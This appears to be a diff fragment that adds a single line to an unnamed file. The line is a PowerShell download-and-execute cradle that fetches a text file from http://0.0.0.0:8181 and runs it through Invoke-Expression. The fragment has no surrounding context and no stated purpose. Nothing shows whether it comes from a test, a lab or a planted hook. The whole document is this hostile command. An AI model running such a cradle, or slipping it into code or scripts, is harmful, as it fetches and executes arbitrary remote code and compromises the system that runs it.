@@ -1,0 +1,1 @@
+powershell IEX (New-Object Net.WebClient).DownloadString('http://0.0.0.0:8181/file.txt')
